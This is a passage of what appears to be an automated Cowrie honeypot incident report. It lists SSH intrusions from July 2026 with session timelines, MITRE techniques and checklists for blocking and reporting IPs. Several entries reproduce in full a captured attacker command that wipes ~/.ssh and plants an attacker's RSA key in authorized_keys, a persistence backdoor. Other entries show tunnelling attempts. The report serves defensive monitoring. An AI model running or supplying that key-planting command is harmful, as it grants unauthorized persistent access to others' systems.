- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f2433a484cb

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-07-13 10:55 |
| **Last Seen** | 2026-07-13 10:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 10:55:34` | `cowrie.session.connect` |
| `2026-07-13 10:55:34` | `cowrie.client.version` |
| `2026-07-13 10:55:34` | `cowrie.client.kex` |
| `2026-07-13 10:55:35` | `cowrie.login.success` |
| `2026-07-13 10:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-463a7dac06a4

| Field | Detail |
|---|---|
| **Source IP** | `109.105.209[.]13` |
| **First Seen** | 2026-07-13 10:56 |
| **Last Seen** | 2026-07-13 10:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 10:56:29` | `cowrie.session.connect` |
| `2026-07-13 10:56:29` | `cowrie.login.success` |
| `2026-07-13 10:56:29` | `cowrie.session.params` |
| `2026-07-13 10:56:29` | `cowrie.command.input` |
| `2026-07-13 10:56:29` | `cowrie.command.input` |
| `2026-07-13 10:56:29` | `cowrie.command.failed` |
| `2026-07-13 10:56:29` | `cowrie.command.input` |
| `2026-07-13 10:56:29` | `cowrie.command.failed` |
| `2026-07-13 10:56:29` | `cowrie.command.input` |
| `2026-07-13 10:56:30` | `cowrie.log.closed` |
| `2026-07-13 10:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.105.209[.]13` to AbuseIPDB if not already reported
- [ ] Block `109.105.209[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1071191402ea

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-13 10:58 |
| **Last Seen** | 2026-07-13 10:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 10:58:11` | `cowrie.session.connect` |
| `2026-07-13 10:58:11` | `cowrie.client.version` |
| `2026-07-13 10:58:11` | `cowrie.client.kex` |
| `2026-07-13 10:58:11` | `cowrie.login.success` |
| `2026-07-13 10:58:12` | `cowrie.direct-tcpip.request` |
| `2026-07-13 10:58:12` | `cowrie.direct-tcpip.data` |
| `2026-07-13 10:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85f202c4f3c2

| Field | Detail |
|---|---|
| **Source IP** | `218.95.73[.]31` |
| **First Seen** | 2026-07-13 11:00 |
| **Last Seen** | 2026-07-13 11:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:00:43` | `cowrie.session.connect` |
| `2026-07-13 11:00:44` | `cowrie.client.version` |
| `2026-07-13 11:00:44` | `cowrie.client.kex` |
| `2026-07-13 11:00:47` | `cowrie.login.success` |
| `2026-07-13 11:00:48` | `cowrie.direct-tcpip.request` |
| `2026-07-13 11:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.95.73[.]31` to AbuseIPDB if not already reported
- [ ] Block `218.95.73[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b348d31c2773

| Field | Detail |
|---|---|
| **Source IP** | `14.48.112[.]8` |
| **First Seen** | 2026-07-13 11:00 |
| **Last Seen** | 2026-07-13 11:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:00:53` | `cowrie.session.connect` |
| `2026-07-13 11:00:54` | `cowrie.client.version` |
| `2026-07-13 11:00:54` | `cowrie.client.kex` |
| `2026-07-13 11:00:56` | `cowrie.login.success` |
| `2026-07-13 11:00:56` | `cowrie.direct-tcpip.request` |
| `2026-07-13 11:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.48.112[.]8` to AbuseIPDB if not already reported
- [ ] Block `14.48.112[.]8` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bcc61b7fe2d

| Field | Detail |
|---|---|
| **Source IP** | `198.38.91[.]219` |
| **First Seen** | 2026-07-13 11:07 |
| **Last Seen** | 2026-07-13 11:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:07:22` | `cowrie.session.connect` |
| `2026-07-13 11:07:22` | `cowrie.client.version` |
| `2026-07-13 11:07:22` | `cowrie.client.kex` |
| `2026-07-13 11:07:24` | `cowrie.login.success` |
| `2026-07-13 11:07:25` | `cowrie.session.params` |
| `2026-07-13 11:07:25` | `cowrie.command.input` |
| `2026-07-13 11:07:25` | `cowrie.command.failed` |
| `2026-07-13 11:07:26` | `cowrie.log.closed` |
| `2026-07-13 11:07:27` | `cowrie.session.params` |
| `2026-07-13 11:07:27` | `cowrie.command.input` |
| `2026-07-13 11:07:28` | `cowrie.session.file_download` |
| `2026-07-13 11:07:28` | `cowrie.log.closed` |
| `2026-07-13 11:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.38.91[.]219` to AbuseIPDB if not already reported
- [ ] Block `198.38.91[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3de4e990304

| Field | Detail |
|---|---|
| **Source IP** | `198.38.91[.]219` |
| **First Seen** | 2026-07-13 11:07 |
| **Last Seen** | 2026-07-13 11:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:07:28` | `cowrie.session.connect` |
| `2026-07-13 11:07:28` | `cowrie.client.version` |
| `2026-07-13 11:07:28` | `cowrie.client.kex` |
| `2026-07-13 11:07:29` | `cowrie.login.success` |
| `2026-07-13 11:07:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.38.91[.]219` to AbuseIPDB if not already reported
- [ ] Block `198.38.91[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7552a9a1ae0

| Field | Detail |
|---|---|
| **Source IP** | `198.38.91[.]219` |
| **First Seen** | 2026-07-13 11:07 |
| **Last Seen** | 2026-07-13 11:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:07:29` | `cowrie.session.connect` |
| `2026-07-13 11:07:29` | `cowrie.client.version` |
| `2026-07-13 11:07:30` | `cowrie.client.kex` |
| `2026-07-13 11:07:31` | `cowrie.login.success` |
| `2026-07-13 11:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.38.91[.]219` to AbuseIPDB if not already reported
- [ ] Block `198.38.91[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc88f5b313af

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 11:07 |
| **Last Seen** | 2026-07-13 11:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:07:34` | `cowrie.session.connect` |
| `2026-07-13 11:07:35` | `cowrie.client.version` |
| `2026-07-13 11:07:35` | `cowrie.client.kex` |
| `2026-07-13 11:07:36` | `cowrie.login.success` |
| `2026-07-13 11:07:37` | `cowrie.session.params` |
| `2026-07-13 11:07:37` | `cowrie.command.input` |
| `2026-07-13 11:07:38` | `cowrie.log.closed` |
| `2026-07-13 11:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7711faa46820

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-07-13 11:09 |
| **Last Seen** | 2026-07-13 11:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:09:47` | `cowrie.session.connect` |
| `2026-07-13 11:09:47` | `cowrie.client.version` |
| `2026-07-13 11:09:47` | `cowrie.client.kex` |
| `2026-07-13 11:09:48` | `cowrie.login.success` |
| `2026-07-13 11:09:49` | `cowrie.session.params` |
| `2026-07-13 11:09:49` | `cowrie.command.input` |
| `2026-07-13 11:09:49` | `cowrie.command.failed` |
| `2026-07-13 11:09:50` | `cowrie.log.closed` |
| `2026-07-13 11:09:51` | `cowrie.session.params` |
| `2026-07-13 11:09:51` | `cowrie.command.input` |
| `2026-07-13 11:09:51` | `cowrie.session.file_download` |
| `2026-07-13 11:09:51` | `cowrie.log.closed` |
| `2026-07-13 11:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd2e37af6ee6

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-07-13 11:09 |
| **Last Seen** | 2026-07-13 11:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:09:51` | `cowrie.session.connect` |
| `2026-07-13 11:09:51` | `cowrie.client.version` |
| `2026-07-13 11:09:51` | `cowrie.client.kex` |
| `2026-07-13 11:09:52` | `cowrie.login.success` |
| `2026-07-13 11:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4d7b9f321fc

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-07-13 11:09 |
| **Last Seen** | 2026-07-13 11:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:09:53` | `cowrie.session.connect` |
| `2026-07-13 11:09:53` | `cowrie.client.version` |
| `2026-07-13 11:09:53` | `cowrie.client.kex` |
| `2026-07-13 11:09:54` | `cowrie.login.success` |
| `2026-07-13 11:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.20[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.172.20[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb3ffbf5700c

| Field | Detail |
|---|---|
| **Source IP** | `8.141.118[.]211` |
| **First Seen** | 2026-07-13 11:10 |
| **Last Seen** | 2026-07-13 11:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:10:20` | `cowrie.session.connect` |
| `2026-07-13 11:10:20` | `cowrie.client.version` |
| `2026-07-13 11:10:20` | `cowrie.client.kex` |
| `2026-07-13 11:10:23` | `cowrie.login.success` |
| `2026-07-13 11:10:24` | `cowrie.session.params` |
| `2026-07-13 11:10:24` | `cowrie.command.input` |
| `2026-07-13 11:10:24` | `cowrie.command.failed` |
| `2026-07-13 11:10:24` | `cowrie.log.closed` |
| `2026-07-13 11:10:25` | `cowrie.session.params` |
| `2026-07-13 11:10:25` | `cowrie.command.input` |
| `2026-07-13 11:10:26` | `cowrie.session.file_download` |
| `2026-07-13 11:10:26` | `cowrie.log.closed` |
| `2026-07-13 11:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.141.118[.]211` to AbuseIPDB if not already reported
- [ ] Block `8.141.118[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6ab79d34459

| Field | Detail |
|---|---|
| **Source IP** | `8.141.118[.]211` |
| **First Seen** | 2026-07-13 11:10 |
| **Last Seen** | 2026-07-13 11:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:10:26` | `cowrie.session.connect` |
| `2026-07-13 11:10:26` | `cowrie.client.version` |
| `2026-07-13 11:10:26` | `cowrie.client.kex` |
| `2026-07-13 11:10:27` | `cowrie.login.success` |
| `2026-07-13 11:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.141.118[.]211` to AbuseIPDB if not already reported
- [ ] Block `8.141.118[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-398e525467a4

| Field | Detail |
|---|---|
| **Source IP** | `8.141.118[.]211` |
| **First Seen** | 2026-07-13 11:10 |
| **Last Seen** | 2026-07-13 11:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:10:28` | `cowrie.session.connect` |
| `2026-07-13 11:10:28` | `cowrie.client.version` |
| `2026-07-13 11:10:28` | `cowrie.client.kex` |
| `2026-07-13 11:10:29` | `cowrie.login.success` |
| `2026-07-13 11:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.141.118[.]211` to AbuseIPDB if not already reported
- [ ] Block `8.141.118[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-489c6fe2c4ce

| Field | Detail |
|---|---|
| **Source IP** | `45.207.196[.]123` |
| **First Seen** | 2026-07-13 11:11 |
| **Last Seen** | 2026-07-13 11:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:11:32` | `cowrie.session.connect` |
| `2026-07-13 11:11:32` | `cowrie.client.version` |
| `2026-07-13 11:11:32` | `cowrie.client.kex` |
| `2026-07-13 11:11:33` | `cowrie.login.success` |
| `2026-07-13 11:11:34` | `cowrie.session.params` |
| `2026-07-13 11:11:34` | `cowrie.command.input` |
| `2026-07-13 11:11:34` | `cowrie.command.failed` |
| `2026-07-13 11:11:35` | `cowrie.log.closed` |
| `2026-07-13 11:11:36` | `cowrie.session.params` |
| `2026-07-13 11:11:36` | `cowrie.command.input` |
| `2026-07-13 11:11:36` | `cowrie.session.file_download` |
| `2026-07-13 11:11:36` | `cowrie.log.closed` |
| `2026-07-13 11:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.207.196[.]123` to AbuseIPDB if not already reported
- [ ] Block `45.207.196[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f72b58af924

| Field | Detail |
|---|---|
| **Source IP** | `45.207.196[.]123` |
| **First Seen** | 2026-07-13 11:11 |
| **Last Seen** | 2026-07-13 11:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:11:36` | `cowrie.session.connect` |
| `2026-07-13 11:11:36` | `cowrie.client.version` |
| `2026-07-13 11:11:36` | `cowrie.client.kex` |
| `2026-07-13 11:11:37` | `cowrie.login.success` |
| `2026-07-13 11:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.207.196[.]123` to AbuseIPDB if not already reported
- [ ] Block `45.207.196[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c4429d9c9fe

| Field | Detail |
|---|---|
| **Source IP** | `45.207.196[.]123` |
| **First Seen** | 2026-07-13 11:11 |
| **Last Seen** | 2026-07-13 11:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:11:38` | `cowrie.session.connect` |
| `2026-07-13 11:11:38` | `cowrie.client.version` |
| `2026-07-13 11:11:38` | `cowrie.client.kex` |
| `2026-07-13 11:11:39` | `cowrie.login.success` |
| `2026-07-13 11:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.207.196[.]123` to AbuseIPDB if not already reported
- [ ] Block `45.207.196[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c20d1b074d6a

| Field | Detail |
|---|---|
| **Source IP** | `171.217.70[.]151` |
| **First Seen** | 2026-07-13 11:17 |
| **Last Seen** | 2026-07-13 11:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:17:03` | `cowrie.session.connect` |
| `2026-07-13 11:17:04` | `cowrie.client.version` |
| `2026-07-13 11:17:04` | `cowrie.client.kex` |
| `2026-07-13 11:17:06` | `cowrie.login.success` |
| `2026-07-13 11:17:07` | `cowrie.direct-tcpip.request` |
| `2026-07-13 11:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.217.70[.]151` to AbuseIPDB if not already reported
- [ ] Block `171.217.70[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31c38e8f6aec

| Field | Detail |
|---|---|
| **Source IP** | `92.255.196[.]185` |
| **First Seen** | 2026-07-13 11:19 |
| **Last Seen** | 2026-07-13 11:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:19:18` | `cowrie.session.connect` |
| `2026-07-13 11:19:18` | `cowrie.client.version` |
| `2026-07-13 11:19:18` | `cowrie.client.kex` |
| `2026-07-13 11:19:19` | `cowrie.login.success` |
| `2026-07-13 11:19:20` | `cowrie.direct-tcpip.request` |
| `2026-07-13 11:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.255.196[.]185` to AbuseIPDB if not already reported
- [ ] Block `92.255.196[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-311ef621c6ff

| Field | Detail |
|---|---|
| **Source IP** | `117.158.166[.]73` |
| **First Seen** | 2026-07-13 11:19 |
| **Last Seen** | 2026-07-13 11:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:19:25` | `cowrie.session.connect` |
| `2026-07-13 11:19:26` | `cowrie.client.version` |
| `2026-07-13 11:19:26` | `cowrie.client.kex` |
| `2026-07-13 11:19:28` | `cowrie.login.success` |
| `2026-07-13 11:19:29` | `cowrie.direct-tcpip.request` |
| `2026-07-13 11:19:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.158.166[.]73` to AbuseIPDB if not already reported
- [ ] Block `117.158.166[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cc58a77d67a

| Field | Detail |
|---|---|
| **Source IP** | `61.184.128[.]210` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:02` | `cowrie.session.connect` |
| `2026-07-13 11:24:03` | `cowrie.client.version` |
| `2026-07-13 11:24:03` | `cowrie.client.kex` |
| `2026-07-13 11:24:07` | `cowrie.login.success` |
| `2026-07-13 11:24:10` | `cowrie.direct-tcpip.request` |
| `2026-07-13 11:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.184.128[.]210` to AbuseIPDB if not already reported
- [ ] Block `61.184.128[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d1d6bc580c9

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
